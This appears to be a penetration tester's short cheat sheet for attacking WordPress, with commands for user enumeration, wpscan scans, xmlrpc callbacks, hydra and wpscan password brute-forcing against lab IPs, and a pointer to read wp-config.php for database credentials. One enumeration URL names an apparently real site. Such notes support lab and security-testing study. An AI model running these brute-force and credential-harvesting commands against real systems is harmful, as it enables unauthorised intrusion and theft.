Find usernames:
<https://www.wooda.co.uk/wp-json/wp/v2/users>
wp-sitemap-users-1.xml

Good starting scan to find all:
wpscan --url <http://10.3.3.34:9999> -e vt,tt,u,ap

Might get you origin IP behind WAF if enabled. Use collaborator for callback.
https://www.target.com/xmlrpc.php

Bruteforcing: (this will identify users too) (don't trust this one always. Has failed for me before when hydra didn't. Run both.)
wpscan --url <http://10.3.3.34:9999> --passwords /usr/share/wordlists/rockyou.txt

wpscan --url <http://10.3.3.34:9999> -U userlist.txt --passwords /usr/share/wordlists/rockyou.txt

When you reach the actual webserver with a shell, make sure to check out:
/var/www/html/wordpress/wp-config.php
There's often database credentials in there.

http-post-form brute with hydra:
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.251 https-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=Location' -V -e nsr -f -t 50

Proxychains:
proxychains -q wpscan --url <http://10.3.3.34:9999> -e vt,tt,u,ap

